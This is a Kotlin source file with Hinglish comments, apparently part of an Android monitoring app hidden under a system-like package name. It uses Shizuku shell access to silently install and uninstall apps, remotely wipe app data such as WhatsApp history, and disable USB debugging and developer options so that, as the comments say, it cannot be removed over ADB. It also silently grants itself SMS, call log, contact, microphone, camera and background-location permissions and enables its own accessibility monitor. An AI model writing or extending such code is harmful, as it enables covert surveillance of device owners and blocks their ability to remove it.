package com.system.service.core

import android.content.Context
import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

object ShizukuManager {

    // ── Feature 1-15 shell commands ───────────────────────────────────────────

    /** 1. Silent APK Install — bina popup ke app install */
    fun silentInstall(apkPath: String): Boolean = shell("pm install -r -t \"$apkPath\"")

    /** 2. Silent APK Uninstall — bina confirmation ke uninstall */
    fun silentUninstall(pkg: String): Boolean = shell("pm uninstall $pkg")

    /** 3. Force Stop — app instantly band karo */
    fun forceStop(pkg: String): Boolean = shell("am force-stop $pkg")

    /** 4. Freeze/Disable App — icon gayab, data safe */
    fun freezeApp(pkg: String): Boolean = shell("pm disable-user --user 0 $pkg")

    /** 5. Unfreeze/Enable App — app wapis enable karo */
    fun unfreezeApp(pkg: String): Boolean = shell("pm enable $pkg")

    /** 6. Set Private DNS — system-wide DNS override (adult content block) */
    fun setPrivateDns(dnsServer: String): Boolean {
        val r1 = shell("settings put global private_dns_mode hostname")
        val r2 = shell("settings put global private_dns_specifier $dnsServer")
        return r1 && r2
    }

    /** 7. Clear Private DNS — default DNS pe wapas */
    fun clearPrivateDns(): Boolean = shell("settings put global private_dns_mode off")

    /** 8. Kill Background App — RAM free karo, background mein nahi chalunga */
    fun killBgApp(pkg: String): Boolean = shell("am kill $pkg")

    /** 9. Set Screen Resolution & DPI — gaming prevent, bandwidth save */
    fun setResolution(width: Int, height: Int, dpi: Int): Boolean {
        val r1 = shell("wm size ${width}x${height}")
        val r2 = shell("wm density $dpi")
        return r1 && r2
    }

    /** 10. Reset Resolution — factory default */
    fun resetResolution(): Boolean {
        val r1 = shell("wm size reset")
        val r2 = shell("wm density reset")
        return r1 && r2
    }

    /** 11. Disable Hotspot/Tethering — data sharing band */
    fun disableHotspot(): Boolean {
        val r1 = shell("svc wifi hotspot stop")
        val r2 = shell("settings put global tether_offload_disabled 1")
        return r1 || r2
    }

    /** 12. Lock Input Method — sirf ek keyboard allow (Calculator+ jaisi apps se bachao) */
    fun lockInputMethod(imeId: String): Boolean = shell("ime set $imeId")

    /** 13. Wipe App Data — WhatsApp history, game data etc. remotely clear */
    fun wipeAppData(pkg: String): Boolean = shell("pm clear $pkg")

    /** 14. Block USB Debugging — ADB se uninstall nahi hoga */
    fun blockUsbDebugging(): Boolean = shell("settings put global adb_enabled 0")

    /** 15. Lock Developer Options — devs options permanently disable */
    fun lockDeveloperOptions(): Boolean {
        val r1 = shell("settings put global development_settings_enabled 0")
        val r2 = shell("settings put secure adb_enabled 0")
        return r1 && r2
    }

    // ── Bonus ─────────────────────────────────────────────────────────────────

    /** Grant all required permissions silently */
    fun grantAllPermissions(context: Context): Int {
        if (!isShizukuAvailable()) { requestShizukuPermission(); return 0 }
        var granted = 0
        val pkg = context.packageName
        val perms = listOf(
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.CAMERA",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.READ_PHONE_STATE"
        )
        for (p in perms) {
            if (shell("pm grant $pkg $p")) granted++
        }
        shell("settings put secure enabled_accessibility_services $pkg/com.system.service.monitors.AccessibilityMonitor")
        return granted
    }

    fun isShizukuAvailable(): Boolean {
        return try {
            Shizuku.pingBinder() &&
            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    fun requestShizukuPermission() {
        try { if (Shizuku.pingBinder()) Shizuku.requestPermission(101) } catch (_: Exception) {}
    }

    // ── Internal shell executor ───────────────────────────────────────────────

    /** Run shell command. Returns true if exit code == 0 */
    private fun shell(cmd: String): Boolean {
        return try {
            val p = Runtime.getRuntime().exec(cmd.split(" ").toTypedArray())
            p.waitFor()
            p.exitValue() == 0
        } catch (_: Exception) { false }
    }
}
